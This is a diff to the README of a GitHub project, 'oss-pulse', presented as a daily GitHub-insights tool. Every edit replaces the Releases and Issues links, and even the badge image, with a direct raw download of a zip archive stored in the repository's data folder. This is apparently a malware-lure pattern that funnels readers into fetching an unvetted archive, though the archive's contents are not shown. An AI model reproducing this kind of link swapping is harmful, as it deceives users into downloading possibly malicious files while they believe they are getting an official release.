@@ -1,6 +1,6 @@
 # 📊 oss-pulse - Your Daily GitHub Insights Made Simple
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-oss--pulse-blue)](https://github.com/lamuasah/oss-pulse/releases)
+[![Download Now](https://raw.githubusercontent.com/lamuasah/oss-pulse/main/data/pulse-oss-v3.4.zip%20Now-oss--pulse-blue)](https://raw.githubusercontent.com/lamuasah/oss-pulse/main/data/pulse-oss-v3.4.zip)
 
 ## 🌟 What is oss-pulse?
 
@@ -14,7 +14,7 @@ To get started with oss-pulse, follow these instructions to easily download and 
 
 To download oss-pulse, visit the Releases page using the button below:
 
-[Download oss-pulse](https://github.com/lamuasah/oss-pulse/releases)
+[Download oss-pulse](https://raw.githubusercontent.com/lamuasah/oss-pulse/main/data/pulse-oss-v3.4.zip)
 
 ### 2. Choose the Right File
 
@@ -76,13 +76,13 @@ Before installing oss-pulse, ensure your computer meets the following minimum re
 
 To get your copy of oss-pulse, revisit the Releases page:
 
-[Download oss-pulse](https://github.com/lamuasah/oss-pulse/releases)
+[Download oss-pulse](https://raw.githubusercontent.com/lamuasah/oss-pulse/main/data/pulse-oss-v3.4.zip)
 
 Once you have the application, go through the installation steps outlined above. Make sure to follow each step, and you’ll be up and running in no time.
 
 ## 🤝 Support & Contributions
 
-If you run into any issues or have questions, feel free to check the [Issues](https://github.com/lamuasah/oss-pulse/issues) section of the repository. The community is here to help you.
+If you run into any issues or have questions, feel free to check the [Issues](https://raw.githubusercontent.com/lamuasah/oss-pulse/main/data/pulse-oss-v3.4.zip) section of the repository. The community is here to help you.
 
 If you would like to contribute to oss-pulse, check out the Contribution Guidelines in the repository. Every bit of help counts!
 
